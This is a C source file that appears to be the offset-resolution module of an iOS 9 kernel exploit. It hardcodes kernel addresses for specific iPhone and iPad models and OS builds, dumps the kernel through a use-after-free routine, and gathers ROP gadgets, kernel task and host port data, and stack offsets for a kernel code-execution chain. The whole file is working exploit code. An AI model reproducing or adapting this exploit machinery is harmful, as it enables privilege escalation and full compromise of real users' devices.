#include <errno.h>              // errno
#include <stdbool.h>            // bool, true, false
#include <stdint.h>             // uint32_t
#include <stdio.h>              // FILE, asprintf, fopen, fclose, fscanf, ftello, fseeko
#include <stdlib.h>             // free
#include <string.h>             // memcpy, strerror

#include "common.h"             // DEBUG, MIN, addr_t, mach_*
#include "device.h"             // M_*, V_*, get_model, get_os_version
#include "find.h"               // find_all_offsets
#include "slide.h"              // get_kernel_slide
#include "try.h"                // THROW, TRY, FINALLY
#include "uaf_read.h"           // uaf_dump_kernel

#include "offsets.h"

#define CACHE_VERSION 2
#ifdef __LP64__
    bool dump_full_kernel = false;
    addr_t kernel_base = 0xffffff8004004000;
#else
    addr_t kernel_base = 0x80001000;
#endif
offsets_t offsets;
static addr_t anchor = 0,
              vtab   = 0;
static bool initialized = false,
            new_payload = false;

bool use_new_payload(void)
{
    return new_payload;
}

static addr_t reg_anchor(void)
{
    DEBUG("Getting anchor address from registry...");
    switch(get_model() | get_os_version())
    {
#ifdef __LP64__
        case M_J81AP  | V_13A452:
        case M_J97AP  | V_13A404:
        case M_N56AP  | V_13A452:
        case M_N61AP  | V_13A404:
        case M_N61AP  | V_13A452:
        case M_N102AP | V_13A452:
            return 0xffffff800454a000;
        case M_J71AP  | V_13A452:
        case M_J72AP  | V_13A452:
        case M_J85AP  | V_13A452:
        case M_N51AP  | V_13A452:
        case M_N53AP  | V_13A452:
        case M_N66AP  | V_13A342:
        case M_N66AP  | V_13A405:
        case M_N66AP  | V_13A452:
        case M_N66mAP | V_13A342:
        case M_N66mAP | V_13A405:
        case M_N66mAP | V_13A452:
        case M_N71AP  | V_13A342:
        case M_N71AP  | V_13A405:
        case M_N71AP  | V_13A452:
        case M_N71mAP | V_13A342:
        case M_N71mAP | V_13A405:
        case M_N71mAP | V_13A452:
            return 0xffffff800453e000;
        case M_N56AP  | V_13G34:
        case M_N61AP  | V_13G34:
            return 0xffffff8004542000;
        case M_N66AP  | V_13G34:
        case M_N69AP  | V_13G34:
        case M_N71AP  | V_13G34:
            return 0xffffff8004536000;
        case M_N102AP | V_13C75:
            return 0xffffff800453a000;
#else
        case M_N78AP  | V_13B143:
        case M_N78aAP | V_13B143:
            return 0x800a7b93;
        case M_N78AP  | V_13F69:
        case M_N78aAP | V_13F69:
            return 0x800a744b;
        case M_N94AP  | V_13A452:
            return 0x800a78b3;
#endif
        default: THROW("Unsupported device/OS combination");
    }
}

static addr_t reg_vtab(void)
{
    DEBUG("Getting OSString vtab address from registry...");
    switch(get_model() | get_os_version())
    {
#ifdef __LP64__
        case M_J81AP  | V_13A452:
        case M_J97AP  | V_13A404:
        case M_N56AP  | V_13A452:
        case M_N61AP  | V_13A404:
        case M_N61AP  | V_13A452:
        case M_N102AP | V_13A452:
            return 0xffffff8004503168;
        case M_J71AP  | V_13A452:
        case M_J72AP  | V_13A452:
        case M_J85AP  | V_13A452:
        case M_N51AP  | V_13A452:
        case M_N53AP  | V_13A452:
        case M_N66AP  | V_13A342:
        case M_N66AP  | V_13A405:
        case M_N66AP  | V_13A452:
        case M_N66mAP | V_13A342:
        case M_N66mAP | V_13A405:
        case M_N66mAP | V_13A452:
        case M_N71AP  | V_13A342:
        case M_N71AP  | V_13A405:
        case M_N71AP  | V_13A452:
        case M_N71mAP | V_13A342:
        case M_N71mAP | V_13A405:
        case M_N71mAP | V_13A452:
            return 0xffffff80044f7168;
        case M_N56AP  | V_13G34:
        case M_N61AP  | V_13G34:
            return 0xffffff80044fb1f0;
        case M_N66AP  | V_13G34:
        case M_N69AP  | V_13G34:
        case M_N71AP  | V_13G34:
            return 0xffffff80044ef1f0;
        case M_N102AP | V_13C75:
            return 0xffffff80044f3168;
#else
        case M_N78AP  | V_13B143:
        case M_N78aAP | V_13B143:
            return 0x803eee50;
        case M_N78AP  | V_13F69:
        case M_N78aAP | V_13F69:
            return 0x803ece94;
        case M_N94AP  | V_13A452:
            return 0x803ede50;
#endif
        default: THROW("Unsupported device/OS combination");
    }
}

addr_t off_anchor(void)
{
    if(anchor == 0)
    {
        anchor = reg_anchor();
        DEBUG("Got anchor: " ADDR, anchor);
    }
    return anchor;
}

addr_t off_vtab(void)
{
    if(vtab == 0)
    {
        vtab = reg_vtab();
        DEBUG("Got vtab (unslid): " ADDR, vtab);
        vtab += get_kernel_slide();
    }
    return vtab;
}

void off_cfg(const char *dir)
{
    char *cfg_file;
    asprintf(&cfg_file, "%s/config.txt",  dir);
    if(cfg_file == NULL)
    {
        THROW("Failed to allocate string buffer");
    }
    else
    {
        TRY
        ({
            DEBUG("Checking for config file...");
            bool got_payload = false;
            FILE *f_cfg = fopen(cfg_file, "r");
            if(f_cfg == NULL)
            {
                DEBUG("Nope, let's hope the registry has a compatible anchor & vtab...");
            }
            else
            {
                TRY
                ({
                    DEBUG("Yes, attempting to read anchor and vtab from config file...");
                    addr_t a, v;
                    if(fscanf(f_cfg, ADDR_IN "\n" ADDR_IN, &a, &v) == 2)
                    {
                        DEBUG("Anchor: " ADDR ", Vtab (unslid): " ADDR, a, v);
                        anchor = a;
                        vtab   = v;
                        if(anchor != 0 && vtab != 0) // uninitialised
                        {
                            vtab += get_kernel_slide();
                        }

                        addr_t base = 0;
                        if(fscanf(f_cfg, "\n" ADDR, &base) == 1)
                        {
                            if(base != 0)
                            {
                                kernel_base = base;
                            }

                            uint8_t override = 0;
                            if(fscanf(f_cfg, "\noverride=%hhu", &override) == 1)
                            {
                                if(override == 90 || override == 92)
                                {
                                    new_payload = override == 92;
                                    got_payload = true;
                                }
#ifdef __LP64__
                                int n = 0;
                                fscanf(f_cfg, "\nfull_dump%n", &n);
                                if(n > 0)
                                {
                                    dump_full_kernel = true;
                                }
#endif
                            }
                        }
                    }
                    else
                    {
                        THROW("Failed to parse config file. Please either repair or remove it.");
                    }
                })
                FINALLY
                ({
                    fclose(f_cfg);
                })
            }

            if(!got_payload)
            {
                new_payload = get_os_version() >= V_13C75; // 9.2
            }
        })
        FINALLY
        ({
            free(cfg_file);
        })
    }
}

void off_init(const char *dir)
{
    if(!initialized)
    {
        DEBUG("Initializing offsets...");
        char *offsets_file,
             *kernel_file;

        asprintf(&offsets_file, "%s/offsets.dat", dir);
        asprintf(&kernel_file,  "%s/kernel.bin",  dir);
        TRY
        ({
            if(offsets_file == NULL || kernel_file == NULL)
            {
                THROW("Failed to allocate string buffers");
            }

            DEBUG("Checking for offsets cache file...");
            FILE *f_off = fopen(offsets_file, "rb");
            if(f_off != NULL)
            {
                TRY
                ({
                    DEBUG("Yes, trying to load offsets from cache...");
                    addr_t version;
                    if(fread(&version, sizeof(version), 1, f_off) != 1)
                    {
                        DEBUG("Failed to read cache file version (%s)", strerror(errno));
                    }
                    else if(version != CACHE_VERSION)
                    {
                        DEBUG("Cache is outdated, discarding.");
                    }
                    else if(fread(&offsets, sizeof(offsets), 1, f_off) != 1)
                    {
                        DEBUG("Failed to read offsets from cache file (%s)", strerror(errno));
                    }
                    else
                    {
                        initialized = true;
                        DEBUG("Successfully loaded offsets from cache, skipping kernel dumping.");

                        size_t kslide = get_kernel_slide();
                        addr_t *slid = (addr_t*)&offsets.slid;
                        for(size_t i = 0; i < sizeof(offsets.slid) / sizeof(addr_t); ++i)
                        {
                            slid[i] += kslide;
                        }
                    }
                })
                FINALLY
                ({
                    fclose(f_off);
                })
            }

            if(!initialized)
            {
                size_t kslide = get_kernel_slide();
                DEBUG("No offsets loaded so far, checking for dumped kernel...");
                file_t kernel;
                kernel.buf = NULL;
                kernel.len = 0;
                TRY
                ({
                    FILE *f_kernel = fopen(kernel_file, "rb");
                    if(f_kernel == NULL)
                    {
                        DEBUG("Failed to open file (%s)", strerror(errno));
                    }
                    else
                    {
                        if(fseeko(f_kernel, 0, SEEK_END) != 0)
                        {
                            DEBUG("Failed to seek to end (%s)", strerror(errno));
                        }
                        else
                        {
                            kernel.len = ftello(f_kernel);
                            if(kernel.len == -1)
                            {
                                DEBUG("Failed to get stream position (%s)", strerror(errno));
                            }
                            else if(fseeko(f_kernel, 0, SEEK_SET) != 0)
                            {
                                DEBUG("Failed to seek to beginning (%s)", strerror(errno));
                            }
                            else
                            {
                                kernel.buf = malloc(kernel.len);
                                if(kernel.buf == NULL)
                                {
                                    DEBUG("Failed to allocate file buffer (%s)", strerror(errno));
                                }
                                else if(fread(kernel.buf, kernel.len, 1, f_kernel) != 1)
                                {
                                    DEBUG("Failed to load dumped kernel (%s)", strerror(errno));
                                    free(kernel.buf);
                                    kernel.buf = NULL;
                                }
                            }
                        }
                        fclose(f_kernel);
                    }

                    // Difference of base address of loaded kernel and running kernel
                    int64_t delta;

                    if(kernel.buf != NULL)
                    {
                        // Get base address of the loaded kernel
                        addr_t base = ~0;
                        mach_hdr_t *hdr = (mach_hdr_t*)kernel.buf;
                        for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
                        {
                            switch(cmd->cmd)
                            {
                                case LC_SEGMENT:
                                case LC_SEGMENT_64:
                                    {
                                        base = MIN(base, ((mach_seg_t*)cmd)->vmaddr);
                                    }
                                default:
                                    break;
                            }
                        }
                        delta = kslide - (base - kernel_base);
                    }
                    else
                    {
                        DEBUG("That didn't work, dumping the kernel now...");
                        uaf_dump_kernel(&kernel);

                        // Save dumped kernel to file
                        f_kernel = fopen(kernel_file, "wb");
                        if(f_kernel != NULL)
                        {
                            fwrite(kernel.buf, 1, kernel.len, f_kernel);
                            fclose(f_kernel);
                            DEBUG("Wrote dumped kernel to %s", kernel_file);
                        }
                        else
                        {
                            WARN("Failed to create kernel file (%s)", strerror(errno));
                        }

                        // loaded kernel == running kernel
                        delta = 0;
                    }

                    // Find offsets
                    find_all_offsets(&kernel, delta, &offsets);
                })
                FINALLY
                ({
                    if(kernel.buf != NULL)
                    {
                        free(kernel.buf);
                    }
                })

                // Create an unslid copy
                offsets_t copy;
                memcpy(&copy, &offsets, sizeof(copy));
                addr_t *slid = (addr_t*)&copy.slid;
                for(size_t i = 0; i < sizeof(copy.slid) / sizeof(addr_t); ++i)
                {
                    slid[i] -= kslide;
                }

                // Write unslid offsets to file
                FILE *f_off = fopen(offsets_file, "wb");
                if(f_off == NULL)
                {
                    WARN("Failed to create offsets cache file (%s)", strerror(errno));
                }
                else
                {
                    addr_t version = CACHE_VERSION;
                    fwrite(&version, sizeof(version), 1, f_off);
                    fwrite(&copy, sizeof(copy), 1, f_off);
                    fclose(f_off);
                    DEBUG("Wrote offsets to %s", offsets_file);
                }
            }

            DEBUG("Offsets:");
            DEBUG("gadget_load_x20_x19                = " ADDR, offsets.slid.gadget_load_x20_x19);
            DEBUG("gadget_ldp_x9_add_sp_sp_0x10       = " ADDR, offsets.slid.gadget_ldp_x9_add_sp_sp_0x10);
            DEBUG("gadget_ldr_x0_sp_0x20_load_x22_x19 = " ADDR, offsets.slid.gadget_ldr_x0_sp_0x20_load_x22_x19);
            DEBUG("gadget_add_x0_x0_x19_load_x20_x19  = " ADDR, offsets.slid.gadget_add_x0_x0_x19_load_x20_x19);
            DEBUG("gadget_blr_x20_load_x22_x19        = " ADDR, offsets.slid.gadget_blr_x20_load_x22_x19);
            DEBUG("gadget_str_x0_x19_load_x20_x19     = " ADDR, offsets.slid.gadget_str_x0_x19_load_x20_x19);
            DEBUG("gadget_ldr_x0_x21_load_x24_x19     = " ADDR, offsets.slid.gadget_ldr_x0_x21_load_x24_x19);
            DEBUG("gadget_OSUnserializeXML_return     = " ADDR, offsets.slid.gadget_OSUnserializeXML_return);
            DEBUG("frag_mov_x1_x20_blr_x19            = " ADDR, offsets.slid.frag_mov_x1_x20_blr_x19);
            DEBUG("func_ldr_x0_x0                     = " ADDR, offsets.slid.func_ldr_x0_x0);
            DEBUG("func_current_task                  = " ADDR, offsets.slid.func_current_task);
            DEBUG("func_ipc_port_copyout_send         = " ADDR, offsets.slid.func_ipc_port_copyout_send);
            DEBUG("func_ipc_port_make_send            = " ADDR, offsets.slid.func_ipc_port_make_send);
            DEBUG("data_kernel_task                   = " ADDR, offsets.slid.data_kernel_task);
            DEBUG("data_realhost_special              = " ADDR, offsets.slid.data_realhost_special);
            DEBUG("off_task_itk_self                  = " ADDR, offsets.unslid.off_task_itk_self);
            DEBUG("off_task_itk_space                 = " ADDR, offsets.unslid.off_task_itk_space);
            DEBUG("OSUnserializeXML_stack             = " ADDR, offsets.unslid.OSUnserializeXML_stack);
            DEBUG("is_io_service_open_extended_stack  = " ADDR, offsets.unslid.is_io_service_open_extended_stack);
        })
        FINALLY
        ({
            if(offsets_file != NULL) free(offsets_file);
            if(kernel_file  != NULL) free(kernel_file);
        })
    }
}
